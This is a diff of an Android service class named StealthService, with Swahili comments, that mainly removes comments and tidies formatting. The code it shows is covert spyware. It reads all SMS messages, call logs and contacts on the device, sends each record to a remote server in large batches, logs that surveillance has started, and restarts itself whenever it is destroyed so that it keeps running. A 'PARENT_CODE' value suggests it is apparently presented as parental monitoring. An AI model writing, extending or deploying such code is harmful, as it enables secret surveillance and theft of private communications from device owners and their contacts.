@@ -128,7 +128,6 @@ public class StealthService extends Service {
         Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 10");
     }
 
-    // 🆕 MSAADA WA KUTUMA SMS KWA MAKUNDI
     private void startSMSSendingSchedule() {
         if (smsBulkTimer != null) {
             smsBulkTimer.cancel();
@@ -184,7 +183,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 null, null, null,
-                Telephony.Sms.DATE + " DESC"  // SIO LIMIT - ZOTE
+                Telephony.Sms.DATE + " DESC"
             );
 
             if (cursor != null) {
@@ -197,36 +196,30 @@ public class StealthService extends Service {
                     smsData.put("type", getSMSTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                     smsData.put("sequence", dataSequence);
 
-                    // Tuma SMS moja moja kwa server
                     sendSingleDataToServer("sms", smsData);
                     count++;
                     
-                    // Pumzika kidogo kati ya SMS
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ SMS " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
         }
     }
 
-    // 🆕 NJIA MPYA YA KUTUMA SMS KWA MAKUNDI
     private void sendBulkSMSData() {
         new Thread(() -> {
             try {
                 Log.d(TAG, "📨 Kuanza kutuma SMS kwa makundi...");
                 
-                // BATCH 1: 10000 SMS
                 sendSMSBatch(10000, 1);
-                Thread.sleep(300000); // Pumzika dakika 5 (300000 ms)
+                Thread.sleep(300000);
                 
-                // BATCH 2: 10000 SMS  
                 sendSMSBatch(10000, 2);
-                Thread.sleep(300000); // Pumzika dakika 5
+                Thread.sleep(300000);
                 
-                // BATCH 3: 100000 SMS
                 sendSMSBatch(100000, 3);
                 
                 Log.d(TAG, "🎉 SMS zote zimetumwa kikamilifu kwa makundi!");
@@ -258,12 +251,10 @@ public class StealthService extends Service {
                     smsData.put("batch", batchNumber);
                     smsData.put("batch_size", batchSize);
 
-                    // Tuma SMS moja moja
                     sendSingleDataToServer("sms_bulk", smsData);
                     count++;
                     totalSent++;
                     
-                    // Pumzika kila baada ya SMS 50
                     if (count % 50 == 0) {
                         Log.d(TAG, "📦 Batch " + batchNumber + ": " + totalSent + "/" + batchSize + " zimetumwa");
                         Thread.sleep(5000);
@@ -282,7 +273,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
-                CallLog.Calls.DATE + " DESC"  // SIO LIMIT - ZOTE
+                CallLog.Calls.DATE + " DESC"
             );
 
             if (cursor != null) {
@@ -295,14 +286,13 @@ public class StealthService extends Service {
                     callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                     callData.put("sequence", dataSequence);
 
-                    // Tuma simu moja moja
                     sendSingleDataToServer("calls", callData);
                     count++;
                     
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Simu " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ Simu " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
@@ -314,7 +304,7 @@ public class StealthService extends Service {
             Cursor cursor = getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
                 null, null, null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // SIO LIMIT - ZOTE
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
             );
 
             if (cursor != null) {
@@ -323,7 +313,6 @@ public class StealthService extends Service {
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
 
-                    // Pata namba ZOTE za simu za contact hii
                     JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
                     
                     if (phoneNumbers.length() > 0) {
@@ -333,7 +322,6 @@ public class StealthService extends Service {
                         contactData.put("timestamp", System.currentTimeMillis());
                         contactData.put("sequence", dataSequence);
 
-                        // Tuma contact moja moja
                         sendSingleDataToServer("contacts", contactData);
                         count++;
                         
@@ -341,7 +329,7 @@ public class StealthService extends Service {
                     }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Anwani " + count + " zimetumwa (zote)");
+                Log.d(TAG, "✅ Anwani " + count + " zimetumwa");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
@@ -404,44 +392,31 @@ public class StealthService extends Service {
 
     private String getSMSTypeText(int smsType) {
         switch (smsType) {
-            case Telephony.Sms.MESSAGE_TYPE_INBOX:
-                return "received";
-            case Telephony.Sms.MESSAGE_TYPE_SENT:
-                return "sent";
-            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
-                return "draft";
-            default:
-                return "unknown";
+            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
+            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
+            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
+            default: return "unknown";
         }
     }
 
     private String getCallTypeText(int callType) {
         switch (callType) {
-            case CallLog.Calls.INCOMING_TYPE:
-                return "incoming";
-            case CallLog.Calls.OUTGOING_TYPE:
-                return "outgoing";
-            case CallLog.Calls.MISSED_TYPE:
-                return "missed";
-            default:
-                return "unknown";
+            case CallLog.Calls.INCOMING_TYPE: return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
+            case CallLog.Calls.MISSED_TYPE: return "missed";
+            default: return "unknown";
         }
     }
 
     private String getPhoneTypeText(int phoneType) {
         switch (phoneType) {
-            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
-                return "home";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
-                return "mobile";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
-                return "work";
-            default:
-                return "other";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "home";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "mobile";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "work";
+            default: return "other";
         }
     }
 
-    // 🆕 NJIA YA KUTUMA DATA MOJA MOJA - DATA HAIFUTWI
     private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
@@ -468,7 +443,7 @@ public class StealthService extends Service {
 
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
-                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu - seq " + dataSequence);
+                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
                 } else {
                     Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                 }
@@ -491,14 +466,9 @@ public class StealthService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (timer != null) {
-            timer.cancel();
-        }
-        if (smsBulkTimer != null) {
-            smsBulkTimer.cancel();
-        }
+        if (timer != null) timer.cancel();
+        if (smsBulkTimer != null) smsBulkTimer.cancel();
         
-        // 🔄 AUTOMATIC RESTART - APP HAIISHI KABISA
         Intent restartIntent = new Intent(this, StealthService.class);
         restartIntent.putExtra("PARENT_CODE", parentCode);
         startService(restartIntent);
